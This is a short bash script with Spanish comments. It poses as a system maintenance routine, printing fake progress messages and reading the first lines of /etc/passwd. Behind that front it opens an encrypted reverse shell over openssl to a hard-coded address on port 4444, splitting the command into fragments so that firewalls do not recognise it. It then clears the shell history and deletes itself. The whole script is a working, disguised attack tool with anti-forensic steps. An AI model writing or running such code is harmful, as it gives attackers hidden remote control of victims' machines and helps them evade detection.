#!/bin/bash

# --- FACHADA DE MANTENIMIENTO ---
echo "Iniciando mantenimiento del sistema..."
cat /etc/passwd | head -n 3
echo "Optimizando kernel..."

# --- OFUSCACIÓN DE COMANDOS (Troceado) ---
# Aquí construimos "openssl", "s_client" y "/tmp/s" por piezas
o="open"; s="ssl"; c="s_cli"; e="ent"
t="/tm"; p="/p/s"
i="-con"; n="nect"

# Dirección del servidor (TU IP)
TARGET="192.168.1.109:4444"

# --- EJECUCIÓN DE LA SHELL CIFRADA ---
# Usamos las variables para que el Firewall no vea "openssl s_client" seguido
($o$s $c$e -quiet $i$n $TARGET < <(mkfifo $t$p; /bin/sh -i < $t$p 2>&1) > $t$p; rm $t$p) > /dev/null 2>&1 &

sleep 1
echo "Actualización completada con éxito."

# --- LIMPIEZA DE HUELLAS ---
history -c
rm -- "$0" 2>/dev/null
exit
